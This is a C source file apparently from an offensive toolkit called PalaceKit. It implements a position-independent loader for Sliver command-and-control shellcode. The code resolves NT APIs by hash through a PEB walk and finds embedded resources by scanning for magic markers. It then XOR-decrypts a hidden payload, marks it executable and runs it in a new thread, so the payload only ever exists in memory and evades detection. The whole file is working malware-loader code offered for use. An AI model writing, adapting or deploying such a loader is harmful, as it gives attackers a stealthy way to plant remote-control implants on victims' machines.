/*
 * loader.c — PalaceKit Sliver shellcode loader.
 *
 * Entry: go(void *loader_arguments)
 *   loader_arguments = data_region_address (set by the entry stub in eval.go).
 *
 * Flow:
 *   1. Self-protect the data region (RW) so we can write to .bss globals.
 *      NtProtectVirtualMemory is resolved inline before any globals are written.
 *   2. resolve_all() — populates NT function pointer globals (writes to .bss).
 *   3. Restore data region to RW (data doesn't need to be executable).
 *   4. Locate embedded resources via magic-marker scan.
 *   5. Set up PICO component.
 *   6. XOR-decrypt and execute Sliver shellcode.
 *
 * IMPORTANT: this file is included into unity.c — do NOT compile standalone.
 * All NT function pointers and patch_resolve() come from services.c (included
 * first), so there are no .refptr / ADDR64 cross-TU relocations.
 */
#include "loader.h"
#include "services.h"
#include "pico.h"

/* ── Magic-marker resource scanner ────────────────────────────────────────
 * Scan forward from the shellcode base for a 4-byte magic value.
 * The byte immediately after the magic is the start of the RESOURCE struct.
 * Called AFTER the data region is marked RW and resolve_all() has run
 * (no globals accessed here — all stack-local).                             */
void *find_resource_by_magic(uint32_t magic) {
    uint8_t *base;
    __asm__ volatile (
        "call 1f\n\t"
        "1: pop %0\n\t"
        "subq $5, %0\n\t"
        : "=r"(base)
        :
        : "cc"
    );
    /* Scan forward up to 16 MB, 1-byte steps (avoids alignment issues).
     * Sanity-check the RESOURCE.len that follows to skip false positives
     * in the code/rdata — real payloads are always < 64 MB.              */
    for (size_t off = 0; off + 8 <= 0x1000000; off++) {
        uint32_t v;
        __builtin_memcpy(&v, base + off, 4);
        if (v == magic) {
            uint32_t len;
            __builtin_memcpy(&len, base + off + 4, 4);
            if (len < 0x4000000u) /* < 64 MB */
                return (void *)(base + off + 4);
        }
    }
    return NULL;
}

/* ── Entry point ── */
void go(void *loader_arguments) {
    /*
     * loader_arguments = data_region_address, set by the 33-byte entry stub:
     *   call  .here
     *   pop   rax          ; rax = stub_base + 5
     *   sub   rax, 5       ; rax = stub_base (= shellcode base)
     *   add   rax, dataOff ; rax = base + (codeSize + rdataSize + 33)
     *   mov   rcx, rax     ; arg1 = data_region
     *
     * We use this to protect the data region so resolve_all() can write .bss.
     */
    uint8_t *data_region = (uint8_t *)loader_arguments;

    /* Step 1: Resolve NtProtectVirtualMemory via PEB walk (stack-only, no .bss) */
    NtProtectVirtualMemory_t NtProtect =
        (NtProtectVirtualMemory_t)patch_resolve(HASH_NtProtectVirtualMemory);

    ULONG old_prot = 0;
    if (NtProtect && data_region) {
        PVOID base = data_region;
        SIZE_T sz  = 0x1000; /* one page covers all .bss globals */
        NtProtect((HANDLE)-1, &base, &sz, PAGE_READWRITE, &old_prot);
    }

    /* Step 2: Resolve all NT functions into .bss globals (now writable) */
    resolve_all();

    /* Step 3: Restore data region protection — RW is fine for data */
    /* (no further protection change needed; data doesn't execute) */

    /* Step 4: Set up PICO component */
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = (HMODULE(*)(LPCSTR))_LoadLibraryA;
    funcs.GetProcAddress = NULL; /* PicoLoad/PicoGetExport don't call this */

    char *pico_src = (char *)find_resource_by_magic(MAGIC_PICO);
    SIZE_T pico_data_size = (SIZE_T)PicoDataSize(pico_src);
    SIZE_T pico_code_size = (SIZE_T)PicoCodeSize(pico_src);

    PVOID pico_data_base = NULL;
    PVOID pico_code_base = NULL;

    _NtAllocateVirtualMemory(
        (HANDLE)-1, &pico_data_base, 0, &pico_data_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    _NtAllocateVirtualMemory(
        (HANDLE)-1, &pico_code_base, 0, &pico_code_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    PicoLoad(&funcs, pico_src, (char *)pico_code_base, (char *)pico_data_base);

    PVOID pico_code_ptr = pico_code_base;
    _NtProtectVirtualMemory(
        (HANDLE)-1, &pico_code_ptr, &pico_code_size,
        PAGE_EXECUTE_READ, &old_prot);

    MEMORY_LAYOUT memory = {0};
    memory.Pico.Data = pico_data_base;
    memory.Pico.Code = pico_code_base;

    /* setup_hooks (no-op for Sliver) */
    typedef void (*SETUP_HOOKS)(IMPORTFUNCS *);
    ((SETUP_HOOKS)PicoGetExport(pico_src, (char *)pico_code_base,
                                __tag_setup_hooks()))(&funcs);

    /* Step 5: XOR-decrypt the Sliver shellcode payload */
    RESOURCE *masked_sc = (RESOURCE *)find_resource_by_magic(MAGIC_DLL);
    RESOURCE *mask_key  = (RESOURCE *)find_resource_by_magic(MAGIC_MASK);

    SIZE_T sc_size = (SIZE_T)masked_sc->len;
    PVOID  sc_rw   = NULL;

    _NtAllocateVirtualMemory(
        (HANDLE)-1, &sc_rw, 0, &sc_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    uint8_t *dst    = (uint8_t *)sc_rw;
    uint8_t *src    = masked_sc->value;
    uint8_t *key    = mask_key->value;
    uint32_t keylen = mask_key->len;

    for (uint32_t i = 0; i < masked_sc->len; i++)
        dst[i] = src[i] ^ key[i % keylen];

    /* Step 6: Mark RX and execute */
    PVOID sc_ptr = sc_rw;
    _NtProtectVirtualMemory(
        (HANDLE)-1, &sc_ptr, &sc_size,
        PAGE_EXECUTE_READ, &old_prot);

    HANDLE hThread = NULL;
    _NtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
        sc_rw, NULL, 0, 0, 0, 0, NULL);

    if (hThread)
        _NtWaitForSingleObject(hThread, FALSE, NULL);

    /* setup_memory (no-op for Sliver) */
    typedef void (*SETUP_MEMORY)(MEMORY_LAYOUT *);
    ((SETUP_MEMORY)PicoGetExport(pico_src, (char *)pico_code_base,
                                 __tag_setup_memory()))(&memory);

    SIZE_T zero = 0;
    _NtFreeVirtualMemory((HANDLE)-1, &sc_rw, &zero, MEM_RELEASE);
}
